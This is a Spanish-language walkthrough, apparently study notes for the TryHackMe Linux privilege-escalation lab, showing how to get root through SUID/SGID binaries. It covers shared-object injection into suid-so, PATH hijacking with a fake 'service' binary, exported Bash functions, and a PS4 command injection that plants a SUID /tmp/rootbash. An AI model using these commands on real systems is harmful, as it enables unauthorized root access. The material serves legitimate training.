# SUID/SGID

## Executables Known Exploit

Encuentra todos los ejecutables SUID/SGID en la máquina virtual Debian:

find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null

Se puede buscar los exploit de los programas que aparezcan.

## Executables Shared Object Injection

El ejecutable SUID /usr/local/bin/suid-so es vulnerable a la inyección de objeto compartido.

```bash
/usr/local/bin/suid-so
```

Ejecuta strace en el archivo y busca en la salida las llamadas a open/access y los errores de "no existe tal archivo":

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Observa que el ejecutable intenta cargar el objeto compartido /home/user/.config/libcalc.so dentro de nuestro directorio personal, pero no puede encontrarlo.

Crea el directorio .config para el archivo libcalc.so:

```bash
mkdir /home/user/.config
```

El código de objeto compartido de ejemplo se puede encontrar en /home/user/tools/suid/libcalc.c. Simplemente genera una shell de Bash. Compila el código en un objeto compartido en la ubicación donde el ejecutable suid-so estaba buscando:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Ejecuta nuevamente el ejecutable suid-so y toma nota de que esta vez, en lugar de una barra de progreso, obtenemos una shell de root.

```bash
/usr/local/bin/suid-so
```

## Executables Environment Variables

El ejecutable SUID /usr/local/bin/suid-env puede ser explotado debido a que hereda la variable de entorno PATH del usuario e intenta ejecutar programas sin especificar una ruta absoluta.

Primero, ejecuta el archivo y observa que parece estar intentando iniciar el servidor web apache2:

```bash
/usr/local/bin/suid-env
```

Ejecuta el comando strings en el archivo para buscar cadenas de caracteres imprimibles:

```bash
strings /usr/local/bin/suid-env
```

Una línea ("service apache2 start") sugiere que el ejecutable service está siendo llamado para iniciar el servidor web, sin embargo, no se está utilizando la ruta completa del ejecutable (/usr/sbin/service).

Compila el código ubicado en /home/user/tools/suid/service.c en un ejecutable llamado service. Este código simplemente genera una shell de Bash:

```bash
gcc -o service /home/user/tools/suid/service.c
```

Antepón el directorio actual (o donde se encuentre el nuevo ejecutable service) a la variable de entorno PATH, y ejecuta el ejecutable suid-env para obtener una shell de root:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

## Executables Abusing Shell Features

El ejecutable /usr/local/bin/suid-env2 es idéntico a /usr/local/bin/suid-env, excepto que utiliza la ruta absoluta del ejecutable service (/usr/sbin/service) para iniciar el servidor web apache2.

Verifica esto con el comando strings:

```bash
strings /usr/local/bin/suid-env2
```

En las versiones de Bash <4.2-048, es posible definir funciones de shell con nombres que se asemejan a rutas de archivo, luego exportar esas funciones para que se utilicen en lugar de cualquier ejecutable real en esa ruta de archivo.

Verifica la versión de Bash instalada en la máquina virtual Debian y asegúrate de que sea inferior a 4.2-048:

```bash
/bin/bash --version
```

Crea una función de Bash con el nombre "/usr/sbin/service" que ejecute una nueva shell de Bash (usando -p para que se conserven los permisos) y exporta la función:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Ejecuta el ejecutable suid-env2 para obtener una shell de root:

```bash
/usr/local/bin/suid-env2
```

Cuando está en modo de depuración, Bash utiliza la variable de entorno PS4 para mostrar un indicador adicional para declaraciones de depuración.

Ejecuta el ejecutable /usr/local/bin/suid-env2 con la depuración de bash habilitada y la variable PS4 establecida en un comando incrustado que crea una versión SUID de /bin/bash:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Ejecuta el ejecutable /tmp/rootbash con -p para obtener una shell que se ejecuta con privilegios de root:

```bash
/tmp/rootbash -p
```

<mark style="color:red;">**CTF**</mark>

{% embed url="https://tryhackme.com/r/room/linuxprivesc" %}

{% embed url="https://juggernaut-sec.com/suid-sgid-part-2-lpe/" %}

{% embed url="https://juggernaut-sec.com/suid-sgid-lpe/" %}
